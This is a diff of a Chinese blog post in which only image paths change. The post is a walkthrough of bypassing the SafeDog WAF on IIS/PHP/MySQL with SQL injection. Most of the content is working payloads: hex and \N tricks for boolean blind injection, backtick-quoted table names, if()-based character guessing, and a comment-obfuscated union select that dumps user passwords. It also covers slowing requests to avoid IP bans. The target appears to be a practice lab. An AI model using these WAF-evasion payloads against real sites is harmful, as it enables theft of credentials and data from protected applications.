@@ -500,25 +500,25 @@
                 <h1 id="iis某狗绕过注入"><a href="#iis某狗绕过注入" class="headerlink" title="iis某狗绕过注入"></a>iis某狗绕过注入</h1><p>对在安全狗4.0.30256版本(2021-09-17 16:19:25下最新版本)防护下的sql绕过，防护等级高级，中间件是iis8.5 php mysql。</p>
 <span id="more"></span>
 
-<p><img src="./day27/image-20210918171933822.png" alt="image-20210918171933822"></p>
-<p><img src="./day27/image-20210918171955717.png" alt="image-20210918171955717"></p>
+<p><img src="/2021/09/17/day27/image-20210918171933822.png" alt="image-20210918171933822"></p>
+<p><img src="/2021/09/17/day27/image-20210918171955717.png" alt="image-20210918171955717"></p>
 <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="先进行简单的尝试"><a href="#先进行简单的尝试" class="headerlink" title="先进行简单的尝试"></a>先进行简单的尝试</h3><pre class="line-numbers language-none"><code class="language-none">?name=vince' union select 1,2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day27/image-20210918172112622.png" alt="image-20210918172112622"></p>
-<p><img src="./day27/image-20210918172322256.png" alt="image-20210918172322256"></p>
+<p><img src="/2021/09/17/day27/image-20210918172112622.png" alt="image-20210918172112622"></p>
+<p><img src="/2021/09/17/day27/image-20210918172322256.png" alt="image-20210918172322256"></p>
 <p>可以看到，sql语句请求被拦截了</p>
 <p>我们删掉union发现拦截消失</p>
-<p><img src="./day27/image-20210918172358621.png" alt="image-20210918172358621"></p>
+<p><img src="/2021/09/17/day27/image-20210918172358621.png" alt="image-20210918172358621"></p>
 <p>猜测union select俩个关键字同时出现会被拦截</p>
 <h3 id="and判断注入"><a href="#and判断注入" class="headerlink" title="and判断注入"></a>and判断注入</h3><p>我们使用and 1=1 and 1=2发现被拦截了</p>
-<p><img src="./day27/image-20210918174025440.png" alt="image-20210918174025440"></p>
+<p><img src="/2021/09/17/day27/image-20210918174025440.png" alt="image-20210918174025440"></p>
 <p>经过尝试发现十六进制不会被拦截，我们用此方法判断注入</p>
 <pre class="line-numbers language-none"><code class="language-none">?name=vince'and unhex(30)!=1--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day27/image-20210918173131426.png" alt="image-20210918173131426"></p>
+<p><img src="/2021/09/17/day27/image-20210918173131426.png" alt="image-20210918173131426"></p>
 <pre class="line-numbers language-none"><code class="language-none">?name=vince'and+0x3a!=1--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day27/image-20210918174110688.png" alt="image-20210918174110688"></p>
+<p><img src="/2021/09/17/day27/image-20210918174110688.png" alt="image-20210918174110688"></p>
 <p>正确显示，判断出存在注入</p>
 <p>判断版本</p>
 <blockquote>
@@ -527,50 +527,50 @@
 <p>整型 数字型抓包修改提交方式 id.php改get.php</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=\Nor(substr(@@version+from+1+for+1)=5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day27/image-20210918181919627.png" alt="image-20210918181919627"></p>
+<p><img src="/2021/09/17/day27/image-20210918181919627.png" alt="image-20210918181919627"></p>
 <p>正确回显</p>
 <h3 id="出数据"><a href="#出数据" class="headerlink" title="出数据"></a>出数据</h3><p>接下来就是看用什么方式出数据，我们这里主要用布尔注入和联合查询</p>
 <h2 id="GET整型布尔注入绕过"><a href="#GET整型布尔注入绕过" class="headerlink" title="GET整型布尔注入绕过"></a>GET整型布尔注入绕过</h2><p>抓包尝试</p>
-<p><img src="./day27/image-20210918182935225.png" alt="image-20210918182935225"></p>
-<p><img src="./day27/image-20210918182955230.png" alt="image-20210918182955230"></p>
+<p><img src="/2021/09/17/day27/image-20210918182935225.png" alt="image-20210918182935225"></p>
+<p><img src="/2021/09/17/day27/image-20210918182955230.png" alt="image-20210918182955230"></p>
 <p>经过尝试发现：users处做了拦截，我们使用反引号绕过</p>
-<p><img src="./day27/image-20210918183102851.png" alt="image-20210918183102851"></p>
+<p><img src="/2021/09/17/day27/image-20210918183102851.png" alt="image-20210918183102851"></p>
 <p>此时我们面临的问题是无法正确回显页面，这样的话我们判断正确与否</p>
 <p>在25提到\N 绕过，我们使用此方法，使用此方法后我们就需要改关键字and，不然null and 任何值都为null，我们使用or</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=\Nor(substr((select+password+from+`users`+limit+1)+from+1+for+1)='e')--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day27/image-20210918183330213.png" alt="image-20210918183330213"></p>
+<p><img src="/2021/09/17/day27/image-20210918183330213.png" alt="image-20210918183330213"></p>
 <p>成功回显</p>
 <h2 id="GET字符型布尔注入绕过"><a href="#GET字符型布尔注入绕过" class="headerlink" title="GET字符型布尔注入绕过"></a>GET字符型布尔注入绕过</h2><p>抓包尝试</p>
-<p><img src="./day27/image-20210918183616925.png" alt="image-20210918183616925"></p>
-<p><img src="./day27/image-20210918183913058.png" alt="image-20210918183913058"></p>
+<p><img src="/2021/09/17/day27/image-20210918183616925.png" alt="image-20210918183616925"></p>
+<p><img src="/2021/09/17/day27/image-20210918183913058.png" alt="image-20210918183913058"></p>
 <p>这里发现被拦截了，猜测跟and 1=1 and 1=2一样被拦截，我们用之前测试出的16进制字符绕过，思路是用if，让0x31跟if作比较，if中做判断，substr截取与猜解比较，正确返回0x31，错误返回0x30。当正确时，页面回显正确</p>
 <p>到这里发现之前有所错误，16进制=还是会被拦截，然而16进制!=不会被拦截</p>
 <p>让之前if中的0x31与3x30调换，截取与猜解对比，正确返回0x30，错误返回0x31</p>
 <pre class="line-numbers language-none"><code class="language-none">?name=vince'and+0x31!=if((substr((select+password+from+`users`+limit+1)+from+1+for+1)='e'),0x30,0x31)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day27/image-20210918184839568.png" alt="image-20210918184839568"></p>
+<p><img src="/2021/09/17/day27/image-20210918184839568.png" alt="image-20210918184839568"></p>
 <p>正确回显了</p>
 <h2 id="GET字符型联合查询绕过"><a href="#GET字符型联合查询绕过" class="headerlink" title="GET字符型联合查询绕过"></a>GET字符型联合查询绕过</h2><p>抓包尝试</p>
-<p><img src="./day27/image-20210918185408551.png" alt="image-20210918185408551"></p>
+<p><img src="/2021/09/17/day27/image-20210918185408551.png" alt="image-20210918185408551"></p>
 <p>被拦截</p>
 <p>之前尝试发现union select 同时出现被拦截</p>
 <p>之前我们在26写过union select 绕过，我们进行尝试即可</p>
 <p>有点多我们把这些例子做个字典跑一下</p>
-<p><img src="./day27/image-20210918190117240.png" alt="image-20210918190117240"></p>
-<p><img src="./day27/image-20210918190238485.png" alt="image-20210918190238485"></p>
+<p><img src="/2021/09/17/day27/image-20210918190117240.png" alt="image-20210918190117240"></p>
+<p><img src="/2021/09/17/day27/image-20210918190238485.png" alt="image-20210918190238485"></p>
 <p>跑之前我们需要考虑线程问题，因为被安全狗防护，如果线程太快可能会被banip，所以我们把线程调低点</p>
-<p><img src="./day27/image-20210918190442451.png" alt="image-20210918190442451"></p>
-<p><img src="./day27/image-20210918190522727.png" alt="image-20210918190522727"></p>
+<p><img src="/2021/09/17/day27/image-20210918190442451.png" alt="image-20210918190442451"></p>
+<p><img src="/2021/09/17/day27/image-20210918190522727.png" alt="image-20210918190522727"></p>
 <p>看来这些例子都不可以</p>
 <p>我们继续进行尝试，终于发现了绕过方法</p>
 <pre class="line-numbers language-none"><code class="language-none">?name=vince'union/*//--+//*/select+1,(select+password+from+`users`+limit+1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day27/image-20210918190846708.png" alt="image-20210918190846708"></p>
+<p><img src="/2021/09/17/day27/image-20210918190846708.png" alt="image-20210918190846708"></p>
 <p>成功回显处password</p>
-<h2 id="POST整型联合查询绕过"><a href="#POST整型联合查询绕过" class="headerlink" title="POST整型联合查询绕过"></a>POST整型联合查询绕过</h2><p><img src="./day27/image-20210918191059286.png" alt="image-20210918191059286"></p>
+<h2 id="POST整型联合查询绕过"><a href="#POST整型联合查询绕过" class="headerlink" title="POST整型联合查询绕过"></a>POST整型联合查询绕过</h2><p><img src="/2021/09/17/day27/image-20210918191059286.png" alt="image-20210918191059286"></p>
 <p>抓包尝试</p>
-<p><img src="./day27/image-20210918191359009.png" alt="image-20210918191359009"></p>
+<p><img src="/2021/09/17/day27/image-20210918191359009.png" alt="image-20210918191359009"></p>
 <p>简单尝试就出来了</p>
 
                 
